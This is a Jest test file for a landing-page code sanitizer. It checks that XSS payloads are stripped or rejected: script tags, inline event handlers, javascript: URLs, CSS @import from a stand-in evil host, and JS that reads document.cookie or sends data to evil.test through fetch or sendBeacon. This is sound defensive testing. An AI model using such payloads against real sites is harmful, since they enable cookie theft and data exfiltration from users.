/**
 * Sanitizador del lienzo en blanco (services/landingCodigo.service.js).
 * Test puro: no toca la base ni levanta el servidor — es la única pieza
 * del modo código que decide qué se guarda, así que conviene tenerla
 * cubierta sola.
 */

const LandingCodigoService = require('../services/landingCodigo.service');

describe('LandingCodigoService.sanitizar', () => {

  describe('HTML', () => {
    it('conserva el marcado normal de una landing', () => {
      const html = '<section class="hero" data-anim="fade"><h1>Hola</h1><p>Texto</p>'
        + '<a class="cta" href="https://gesicomm.com">Comprar</a>'
        + '<img src="https://cdn.test/foto.jpg" alt="foto" loading="lazy"></section>';
      const { html: limpio, advertencias } = LandingCodigoService.sanitizar({ html });
      expect(limpio).toContain('class="hero"');
      expect(limpio).toContain('data-anim="fade"');
      expect(limpio).toContain('href="https://gesicomm.com"');
      expect(limpio).toContain('src="https://cdn.test/foto.jpg"');
      expect(advertencias).toHaveLength(0);
    });

    it('descarta <script> y su contenido', () => {
      const { html, advertencias } = LandingCodigoService.sanitizar({
        html: '<div>ok</div><script>alert(document.cookie)</script>',
      });
      expect(html).toBe('<div>ok</div>');
      expect(html).not.toContain('alert');
      expect(advertencias.join(' ')).toMatch(/script/i);
    });

    it('descarta atributos de evento inline', () => {
      const { html, advertencias } = LandingCodigoService.sanitizar({
        html: '<button onclick="robar()" onmouseover="x()">Click</button>',
      });
      expect(html).toBe('<button>Click</button>');
      expect(advertencias.join(' ')).toMatch(/evento/i);
    });

    it('descarta href javascript: pero deja mailto/tel', () => {
      const { html } = LandingCodigoService.sanitizar({
        html: '<a href="javascript:alert(1)">a</a><a href="mailto:h@x.com">b</a><a href="tel:+595981000000">c</a>',
      });
      expect(html).not.toContain('javascript:');
      expect(html).toContain('mailto:h@x.com');
      expect(html).toContain('tel:+595981000000');
    });

    it('permite embeber YouTube pero no un iframe de cualquier host', () => {
      const { html } = LandingCodigoService.sanitizar({
        html: '<iframe src="https://www.youtube.com/embed/abc"></iframe><iframe src="https://phishing.test/x"></iframe>',
      });
      expect(html).toContain('https://www.youtube.com/embed/abc');
      expect(html).not.toContain('phishing.test');
    });

    it('conserva SVG inline', () => {
      const { html } = LandingCodigoService.sanitizar({
        html: '<svg viewBox="0 0 24 24" fill="none"><path d="M4 4h16" stroke="currentColor"/></svg>',
      });
      expect(html).toContain('<svg');
      expect(html).toContain('d="M4 4h16"');
    });

    it('rechaza un HTML por encima del límite de tamaño', () => {
      const gigante = '<p>x</p>'.repeat(LandingCodigoService.MAX_HTML);
      expect(() => LandingCodigoService.sanitizar({ html: gigante }))
        .toThrow('Validación fallida.');
    });
  });

  describe('CSS', () => {
    it('deja pasar CSS normal, incluido url() de imágenes y fuentes', () => {
      const css = '.hero { background: url(https://cdn.test/bg.jpg) center/cover; }\n'
        + '@media (max-width: 600px) { .hero { padding: 16px; } }';
      const { css: limpio, advertencias } = LandingCodigoService.sanitizar({ css });
      expect(limpio).toBe(css);
      expect(advertencias).toHaveLength(0);
    });

    it('quita @import, expression() y url(javascript:)', () => {
      const { css, advertencias } = LandingCodigoService.sanitizar({
        css: '@import url("//evil.test/x.css");\nbody { color: red; }\n.a { width: expression(alert(1)); }\n.b { background: url(javascript:alert(1)); }',
      });
      expect(css).toContain('body { color: red; }');
      expect(css).not.toMatch(/@import/i);
      expect(css).not.toMatch(/expression\s*\(/i);
      expect(css).not.toMatch(/javascript:/i);
      expect(advertencias.length).toBeGreaterThanOrEqual(3);
    });

    it('no deja cerrar el <style> del documento', () => {
      const { css } = LandingCodigoService.sanitizar({
        css: 'body{color:red}\n</style><script>alert(1)</script>',
      });
      expect(css).not.toMatch(/<\s*\/?\s*(style|script)/i);
    });
  });

  describe('JavaScript', () => {
    it('acepta el JS típico de una landing', () => {
      const js = [
        "document.querySelectorAll('.faq-item').forEach((el) => {",
        "  el.addEventListener('click', () => el.classList.toggle('abierto'));",
        '});',
      ].join('\n');
      const resultado = LandingCodigoService.sanitizar({ js });
      expect(resultado.js).toBe(js);
      expect(resultado.advertencias).toHaveLength(0);
    });

    it.each([
      ['document.cookie', 'const c = document.cookie;'],
      ['localStorage', "localStorage.setItem('a', 1);"],
      ['parent', "window.parent.location = 'https://evil.test';"],
      ['fetch', "fetch('https://evil.test', { method: 'POST' });"],
      ['XMLHttpRequest', 'new XMLHttpRequest();'],
      ['eval', "eval('alert(1)');"],
      ['new Function', "new Function('alert(1)')();"],
      ['sendBeacon', "navigator.sendBeacon('https://evil.test', 'x');"],
      ['document.write', "document.write('<h1>x</h1>');"],
      ['postMessage', "postMessage('x', '*');"],
    ])('rechaza el guardado si el JS usa %s', (_etiqueta, js) => {
      expect(() => LandingCodigoService.sanitizar({ js })).toThrow('Validación fallida.');
    });

    it('el error lista cada motivo, para poder mostrarlos en el editor', () => {
      try {
        LandingCodigoService.sanitizar({ js: "fetch('/x'); document.cookie;" });
        throw new Error('debió lanzar');
      } catch (err) {
        expect(err.errores).toHaveLength(2);
        expect(err.errores.join(' ')).toMatch(/fetch/);
        expect(err.errores.join(' ')).toMatch(/document\.cookie/);
      }
    });
  });

  it('rechaza un código que no sea un objeto {html, css, js}', () => {
    expect(() => LandingCodigoService.sanitizar('<h1>x</h1>')).toThrow('Validación fallida.');
    expect(() => LandingCodigoService.sanitizar(null)).toThrow('Validación fallida.');
    expect(() => LandingCodigoService.sanitizar([])).toThrow('Validación fallida.');
  });
});
